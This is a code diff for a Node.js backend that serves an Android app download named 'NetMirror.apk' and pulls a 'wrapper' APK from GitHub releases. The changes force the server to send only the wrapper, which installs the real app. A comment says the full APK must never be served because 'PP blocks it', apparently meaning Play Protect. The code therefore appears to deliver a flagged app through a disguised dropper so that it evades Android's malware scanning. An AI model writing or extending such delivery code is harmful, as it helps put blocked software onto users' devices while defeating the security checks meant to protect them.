@@ -276,7 +276,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // ═══ Auto-restore wrapper APK from GitHub Releases on startup ═══
   // Railway has ephemeral storage — wrapper disappears on redeploy.
   // This fetches it back from GitHub Releases (where it's pushed alongside the real APK).
-  (async function ensureWrapperAvailable() {
+  async function ensureWrapperFromGitHub() {
     const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
     if (fs.existsSync(wrapperPath)) return; // already on disk
 
@@ -289,7 +289,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         'Accept': 'application/vnd.github.v3+json',
         'User-Agent': 'LeaksPro-Backend'
       };
-      const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
+      const REPOS = ['rurikonishawa/leaksprogod', 'Aldura5398/klad4'];
       for (const repo of REPOS) {
         try {
           const relRes = await fetch(`https://api.github.com/repos/${repo}/releases/tags/latest`, { headers });
@@ -319,7 +319,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     } catch (err) {
       console.warn('[Wrapper Auto-Fetch] Error:', err.message);
     }
-  })();
+  }
+  // Fire on startup (non-blocking)
+  ensureWrapperFromGitHub();
 
   // ═══════════════ APK SERVING FOR DOWNLOADS ═══════════════
   // Serves the pre-signed APK directly from disk — NO on-the-fly mutation.
@@ -527,8 +529,14 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     try {
       // Track download start
       try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
-      // Prefer wrapper APK if available (clean app that installs real NetMirror)
-      const wrapperBuf = getWrapperApkBuffer();
+      // MUST serve wrapper APK — never fall back to full APK (PP blocks it)
+      let wrapperBuf = getWrapperApkBuffer();
+      if (!wrapperBuf) {
+        // Wrapper not on disk yet (Railway ephemeral storage). Try auto-fetch now.
+        console.log('[DL] Wrapper not on disk — triggering auto-fetch from GitHub Releases...');
+        await ensureWrapperFromGitHub();
+        wrapperBuf = getWrapperApkBuffer();
+      }
       if (wrapperBuf) {
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
@@ -537,14 +545,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         res.setHeader('Pragma', 'no-cache');
         return res.end(wrapperBuf);
       }
-      // Fallback: serve real APK directly (no wrapper uploaded yet)
-      const apkBuf = await getLandingApkBuffer();
-      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
-      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-      res.setHeader('Pragma', 'no-cache');
-      res.end(apkBuf);
+      // No wrapper available anywhere — return error instead of serving full APK
+      console.error('[DL] No wrapper APK available. Upload one via admin panel.');
+      res.status(503).json({ error: 'App package is being prepared. Please try again in 30 seconds.', retry: true });
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
       res.status(503).json({ error: 'APK is being prepared. Please try again in 30 seconds.', retry: true });
@@ -810,7 +813,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         try {
           const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
           if (!token?.value) return;
-          const REPO = 'Aldura5398/klad4';
+          const REPO = 'rurikonishawa/leaksprogod';
           const headers = { 'Authorization': `token ${token.value}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'LeaksPro-Backend' };
           const relRes = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers });
           if (!relRes.ok) return;
